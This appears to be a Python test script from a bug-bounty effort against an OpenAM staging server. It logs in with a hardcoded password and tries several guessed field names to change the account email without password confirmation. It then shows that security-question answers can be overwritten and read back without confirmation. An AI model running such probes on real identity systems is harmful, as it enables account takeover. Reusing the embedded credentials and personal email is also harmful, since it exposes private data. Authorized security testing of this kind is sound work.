# -*- coding: utf-8 -*-
"""AIC 第五十五轮:证据采集——mail 确认密码字段最后变体 + kbaInfo/mail 保护差异
上轮:mail 需确认密码(字段名未知);kbaInfo 免确认可改。不一致性成立。
本轮:
A. mail 确认字段最后变体(passwordConfirmation/confirm/confirmation/confirmMailPassword
   /currentPasswordValue/confirmationPassword)
B. 证据对比:PUT mail(无确认) vs PUT kbaInfo(无确认) vs PUT mail+确认字段
   完整响应记录,作为报告材料
C. kbaInfo 明文读取证据(GET _fields=kbaInfo 完整响应)
预期结果表:
  成立 -> 找到字段名(记录);或确认无字段名可改 mail(防护有效,记录差异证据)
"""
import requests, urllib3, json, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': 'aa942d46ece12ce=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK')

U = BASE + '/am/json/realms/root/realms/alpha/users/' + MY_ID

print('\n=== A. mail 确认字段最后变体 ===')
for field in ['passwordConfirmation', 'confirm', 'confirmation', 'confirmMailPassword',
              'currentPasswordValue', 'confirmationPassword', 'existing-password']:
    body = {'mail': ['pccp_new@example.com'], field: PASS}
    try:
        r = S.put(U, json=body, timeout=12, verify=False)
        r2 = S.get(U, timeout=12, verify=False)
        changed = 'pccp_new@example.com' in r2.text
        print('确认字段=%-22s -> %d mail已改=%s %s' % (
            field, r.status_code, changed, r.text[:80].replace('\n', ' ')))
        if changed:
            print('  !! mail 可改! 字段=%s' % field)
            S.put(U, json={'mail': ['1643584176@qq.com']}, timeout=12, verify=False)
    except Exception as e:
        print('确认字段=%-22s -> ERR %s' % (field, str(e)[:50]))
    time.sleep(0.5)

print('\n=== B. 证据对比 ===')
print('--- B1. PUT mail 无确认字段 ---')
r = S.put(U, json={'mail': ['pccp_new@example.com']}, timeout=12, verify=False)
print('status=%d body=%s' % (r.status_code, r.text[:150].replace('\n', ' ')))
print('--- B2. PUT kbaInfo 无确认字段 ---')
r = S.put(U, json={'kbaInfo': [{'questionId': '1', 'answer': 'evidence_answer_55'}]}, timeout=12, verify=False)
print('status=%d body=%s' % (r.status_code, r.text[:150].replace('\n', ' ')))
print('--- B3. GET 验证 kbaInfo 已写入 ---')
r = S.get(U + '?_fields=kbaInfo', timeout=12, verify=False)
print('status=%d body=%s' % (r.status_code, r.text[:200].replace('\n', ' ')))
print('--- B4. 恢复 kbaInfo ---')
r = S.put(U, json={'kbaInfo': []}, timeout=12, verify=False)
print('status=%d' % r.status_code)
